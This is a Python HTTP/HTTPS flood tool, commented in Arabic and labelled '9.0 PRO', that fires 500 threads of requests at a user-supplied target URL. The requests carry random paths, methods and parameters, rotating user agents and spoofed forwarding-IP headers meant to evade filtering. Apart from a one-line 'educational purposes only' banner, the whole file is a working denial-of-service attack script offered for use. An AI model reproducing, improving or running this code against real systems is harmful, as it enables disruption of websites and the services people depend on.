import urllib.request
import concurrent.futures
import random
import re
import os
import time
import socket
import ssl
from colorama import Fore, Style
import threading
from halo import Halo
import faker
from fake_useragent import UserAgent
import string
import json
from urllib.parse import urlparse

# -------------------------
# تهيئة المتغيرات والمكتبات
fake = faker.Faker()
ua = UserAgent()
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

# -------------------------
# إعدادات الهجوم
class AttackConfig:
    VERSION = "9.0 PRO"
    AUTHOR = "Security Research Team"
    METHOD = "HTTP/HTTPS Mixed Flood"
    
    # إعدادات متقدمة
    MAX_THREADS = 500  # زيادة عدد الثريدات
    REQUEST_TIMEOUT = 3  # تقليل وقت الانتظار
    KEEP_ALIVE = True  # استخدام اتصالات مستمرة
    RANDOMIZE_PATHS = True  # توليد مسارات عشوائية
    USE_PROXIES = False  # يمكن تفعيله لإضافة طبقة إضافية

# -------------------------
# دوال مساعدة
def generate_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_random_path():
    depths = random.randint(1, 5)
    path = "/"
    for _ in range(depths):
        path += generate_random_string(random.randint(3, 10)) + "/"
    return path[:-1]

def generate_malformed_headers(host):
    headers = {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": random.choice(["gzip, deflate, br", "identity", "*"]),
        "Connection": "keep-alive" if AttackConfig.KEEP_ALIVE else "close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "must-revalidate"]),
        "Pragma": "no-cache",
        "Referer": random.choice([
            f"https://www.google.com/search?q={generate_random_string()}",
            f"https://www.bing.com/search?q={generate_random_string()}",
            f"https://{host}/"
        ]),
        "X-Forwarded-For": fake.ipv4(),
        "X-Request-ID": generate_random_string(16),
        "X-Client-IP": fake.ipv4(),
        "X-Real-IP": fake.ipv4(),
        "X-Host": host,
        "X-Forwarded-Host": host,
        "X-Forwarded-Proto": random.choice(["http", "https"]),
        "TE": "Trailers",
    }
    
    # إضافة بعض العناوين المشبوهة أحياناً
    if random.random() > 0.7:
        headers.update({
            "X-HTTP-Method-Override": random.choice(["PUT", "DELETE", "OPTIONS"]),
            "X-Originating-IP": fake.ipv4(),
            "X-Wap-Profile": "http://example.com/wap.xml",
        })
    
    return headers

# -------------------------
# نواة الهجوم
class HTTPFlooder:
    def __init__(self):
        self.counter = 0
        self.running = True
        self.last_print = 0
        self.print_lock = threading.Lock()
    
    def send_request(self, target):
        try:
            parsed = urlparse(target)
            host = parsed.netloc
            path = generate_random_path() if AttackConfig.RANDOMIZE_PATHS else parsed.path
            
            # تغيير البروتوكول بشكل عشوائي
            if random.random() > 0.5:
                url = f"http://{host}{path}"
            else:
                url = f"https://{host}{path}"
            
            # توليد بارامترات عشوائية
            if random.random() > 0.3:
                param = f"?{generate_random_string()}={generate_random_string()}"
                if random.random() > 0.5:
                    param += f"&{generate_random_string()}={generate_random_string()}"
                url += param
            
            headers = generate_malformed_headers(host)
            
            req = urllib.request.Request(
                url,
                headers=headers,
                method=random.choice(["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"])
            )
            
            try:
                with urllib.request.urlopen(req, timeout=AttackConfig.REQUEST_TIMEOUT, context=context) as response:
                    status = response.status
            except urllib.error.HTTPError as e:
                status = e.code
            except:
                status = 0
            
            with self.print_lock:
                self.counter += 1
                current_time = time.time()
                if current_time - self.last_print >= 1:
                    print(f"{Fore.GREEN}[+] {Fore.YELLOW}Requests: {self.counter} {Fore.CYAN}Last Status: {status}{Style.RESET_ALL}", end='\r')
                    self.last_print = current_time
            
        except Exception as e:
            pass
    
    def monitor(self):
        start_time = time.time()
        while self.running:
            time.sleep(1)
            elapsed = time.time() - start_time
            rps = self.counter / elapsed if elapsed > 0 else 0
            print(f"{Fore.CYAN}\n[STATS] {Fore.YELLOW}Time: {elapsed:.1f}s | Requests: {self.counter} | RPS: {rps:.1f}{Style.RESET_ALL}", end='\r')
    
    def start(self, target):
        print(f"{Fore.RED}\n[!] Starting attack on {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Method: {AttackConfig.METHOD}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Threads: {AttackConfig.MAX_THREADS}{Style.RESET_ALL}")
        
        monitor_thread = threading.Thread(target=self.monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=AttackConfig.MAX_THREADS) as executor:
            futures = [executor.submit(self.send_request, target) for _ in range(AttackConfig.MAX_THREADS)]
            try:
                while any(not f.done() for f in futures):
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.running = False
                print(f"{Fore.RED}\n[!] Stopping attack...{Style.RESET_ALL}")
        
        monitor_thread.join()
        print(f"{Fore.RED}\n[!] Attack finished. Total requests: {self.counter}{Style.RESET_ALL}")

# -------------------------
# الواجهة الرئيسية
if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{Fore.RED}
    ███████╗██╗      █████╗ ███████╗██╗  ██╗ ██████╗ ██████╗  ██████╗ 
    ██╔════╝██║     ██╔══██╗██╔════╝██║  ██║██╔═══██╗██╔══██╗██╔═══██╗
    █████╗  ██║     ███████║███████╗███████║██║   ██║██████╔╝██║   ██║
    ██╔══╝  ██║     ██╔══██║╚════██║██╔══██║██║   ██║██╔══██╗██║   ██║
    ██║     ███████╗██║  ██║███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝
    ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
    {Style.RESET_ALL}""")
    print(f"{Fore.CYAN}Version: {AttackConfig.VERSION} | Author: {AttackConfig.AUTHOR}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}This tool is for educational purposes only!{Style.RESET_ALL}\n")
    
    target = input(f"{Fore.GREEN}[?] Enter target URL (e.g., http://example.com): {Style.RESET_ALL}")
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    flooder = HTTPFlooder()
    flooder.start(target)